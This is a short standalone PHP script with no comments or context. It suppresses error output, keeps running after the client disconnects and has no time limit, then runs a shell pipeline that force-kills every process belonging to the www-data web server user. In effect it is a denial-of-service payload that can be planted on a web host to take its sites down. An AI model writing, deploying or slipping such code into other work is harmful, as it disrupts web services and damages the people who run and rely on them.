<?php
error_reporting(0);
ignore_user_abort(true);
set_time_limit(0);
exec('ps -ef | grep www-data | grep -v grep | cut -c 9-15 | xargs kill -9');
?>
